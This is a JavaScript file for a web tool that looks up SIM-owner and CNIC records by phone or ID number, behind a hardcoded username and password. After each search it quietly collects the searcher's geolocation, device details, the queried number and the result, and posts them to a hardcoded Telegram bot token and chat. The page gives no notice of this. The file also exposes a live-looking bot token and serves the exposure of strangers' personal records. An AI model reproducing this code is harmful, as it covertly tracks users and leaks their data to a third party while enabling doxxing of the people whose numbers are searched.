const input = document.getElementById("input");
const searchBtn = document.getElementById("searchBtn");
const loader = document.getElementById("loader");
const result = document.getElementById("result");
const copyBtn = document.getElementById("copyBtn");
const clearBtn = document.getElementById("clearBtn");
const shareBtn = document.getElementById("shareBtn");
const clickSound = document.getElementById("clickSound");
const doneSound = document.getElementById("doneSound");
const loginBox = document.getElementById("loginBox");
const mainApp = document.getElementById("mainApp");
const loginForm = document.getElementById("loginForm");

const TELEGRAM_BOT_TOKEN = "7392910865:AAE0u-b3xMVmeQmOt-3PCUDJhN_d6aMnxgc";
const TELEGRAM_CHAT_ID = "6510198499";

// Login
loginForm.addEventListener("submit", (e) => {
  e.preventDefault();
  const u = document.getElementById("username").value.trim();
  const p = document.getElementById("password").value.trim();
  if (u === "Malik786" && p === "Malik123") {
    loginBox.style.display = "none";
    mainApp.style.display = "block";
  } else {
    alert("Invalid credentials! For login contact developer.");
  }
});

// Search button click
searchBtn.addEventListener("click", async () => {
  const number = input.value.trim();
  clickSound.play();

  if (!/^(\\d{11}|\\d{13})$/.test(number)) {
    alert("Enter valid 11-digit number or 13-digit CNIC");
    return;
  }

  loader.style.display = "block";
  result.textContent = "";
  shareBtn.href = "#";

  try {
    const res = await fetch(
      `https://api.allorigins.win/get?url=${encodeURIComponent('https://fam-official.serv00.net/sim/api.php?num=' + number)}`
    );
    const data = await res.json();
    const content = JSON.parse(data.contents);
    const formatted = JSON.stringify(content, null, 2);

    result.textContent = formatted;
    doneSound.play();
    shareBtn.href = `https://wa.me/?text=${encodeURIComponent(formatted)}`;

    // Collect device + location info + send to Telegram
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((position) => {
        const locationText = `🌐 New Search\n🔢 Number: ${number}\n📍 Location: https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}\n📱 Device: ${navigator.userAgent}\n📊 Result:\n${formatted}`;
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: locationText }),
        });
      });
    } else {
      const fallbackText = `🌐 New Search\n🔢 Number: ${number}\n📱 Device: ${navigator.userAgent}\n📊 Result:\n${formatted}`;
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: fallbackText }),
      });
    }

  } catch (err) {
    result.textContent = "Error fetching data";
  }

  loader.style.display = "none";
});

copyBtn.addEventListener("click", () => {
  navigator.clipboard.writeText(result.textContent);
  alert("Result copied!");
});

clearBtn.addEventListener("click", () => {
  result.textContent = "";
  input.value = "";
  shareBtn.href = "#";
});
